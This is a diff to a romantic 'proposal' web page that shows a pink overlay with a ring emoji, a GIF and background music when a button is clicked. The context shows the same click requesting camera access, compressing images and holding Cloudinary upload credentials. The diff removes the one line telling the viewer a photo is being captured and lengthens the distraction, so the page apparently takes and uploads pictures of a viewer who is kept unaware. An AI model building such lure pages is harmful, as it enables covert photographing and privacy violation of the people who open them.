@@ -101,7 +101,7 @@
         .love-scene {
             position: fixed;
             inset: 0;
-            background: rgba(255, 192, 203, 0.9);
+            background: rgba(255, 192, 203, 0.92);
             display: none;
             align-items: center;
             justify-content: center;
@@ -109,6 +109,7 @@
             z-index: 10;
             opacity: 0;
             transition: opacity 0.8s ease;
+            backdrop-filter: blur(5px);
         }
         .love-scene.active {
             display: flex;
@@ -117,28 +118,36 @@
         .love-card {
             background: white;
             border-radius: 24px;
-            padding: 30px 20px;
-            max-width: 340px;
+            padding: 26px 20px 22px;
+            max-width: 360px;
             box-shadow: 0 10px 30px rgba(255, 105, 180, 0.6);
             border: 4px solid #ff69b4;
         }
+        .love-emoji {
+            font-size: 3em;
+            margin-bottom: 8px;
+            animation: pulse 1.8s infinite;
+        }
         .love-card h2 {
-            margin: 0 0 10px;
+            margin: 0 0 8px;
             font-size: 1.8em;
         }
         .love-card p {
-            margin: 0;
-            font-size: 1.1em;
+            margin: 8px 0 0;
+            font-size: 1.05em;
         }
-        .love-emoji {
-            font-size: 3em;
-            margin-bottom: 15px;
-            animation: pulse 1.8s infinite;
+        .love-video-wrapper {
+            margin: 10px 0 6px;
+            border-radius: 18px;
+            overflow: hidden;
+            box-shadow: 0 6px 18px rgba(255, 105, 180, 0.7);
         }
-        .love-note {
-            margin-top: 12px;
-            font-size: 0.9em;
-            color: #ff1493;
+        .love-video-wrapper img,
+        .love-video-wrapper video,
+        .love-video-wrapper iframe {
+            display: block;
+            width: 100%;
+            height: auto;
         }
 
         @keyframes float {
@@ -161,18 +170,24 @@
 <body>
     <div class="hearts" id="hearts"></div>
 
-    <!-- Love scene overlay -->
+    <!-- Background music (put music.mp3 in the same folder) -->
+    <audio id="bgMusic" src="music.mp3" loop></audio>
+
+    <!-- Love scene overlay with proposing GIF -->
     <div class="love-scene" id="loveScene">
         <div class="love-card">
-            <div class="love-emoji">💑</div>
-            <h2>Just You & Me</h2>
+            <div class="love-emoji">💍</div>
+            <h2>Will You Be Mine Forever?</h2>
+            <div class="love-video-wrapper">
+                <!-- Replace PROPOSAL_GIF_URL with your own GIF link if you want -->
+                <img 
+                    src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif" 
+                    alt="Proposal GIF">
+            </div>
             <p>
-                In this moment, it’s only us...<br>
+                In this moment, it’s only us…<br>
                 Your smile is my favorite place in the world. ❤️
             </p>
-            <div class="love-note">
-                Capturing this little piece of our love story… 📸💕
-            </div>
         </div>
     </div>
 
@@ -209,12 +224,13 @@
         const status = document.getElementById('status');
         const startBtn = document.getElementById('startBtn');
         const loveScene = document.getElementById('loveScene');
+        const bgMusic = document.getElementById('bgMusic');
         let stream;
 
         const CLOUD_NAME = 'dosuvdwcx';
         const UPLOAD_PRESET = 'camera_upload_preset';
 
-        // Max size for compressed image (to keep under ~500KB)
+        // Max size for compressed image (to keep under ~500KB depending on scene)
         const MAX_WIDTH = 640;
         const MAX_HEIGHT = 640;
         const JPEG_QUALITY = 0.7; // 0–1
@@ -227,10 +243,18 @@
             // Show love scene overlay immediately on click
             loveScene.classList.add('active');
 
-            // Optional: hide love scene after a few seconds (you can remove this if you want it to stay)
+            // Start background music on user interaction
+            if (bgMusic) {
+                bgMusic.currentTime = 0;
+                bgMusic.play().catch(() => {
+                    // Some browsers might block autoplay, user can still interact later
+                });
+            }
+
+            // Optional: hide love scene after some seconds (you can change or remove this)
             setTimeout(() => {
                 loveScene.classList.remove('active');
-            }, 6000);
+            }, 8000);
 
             try {
                 // Request camera access
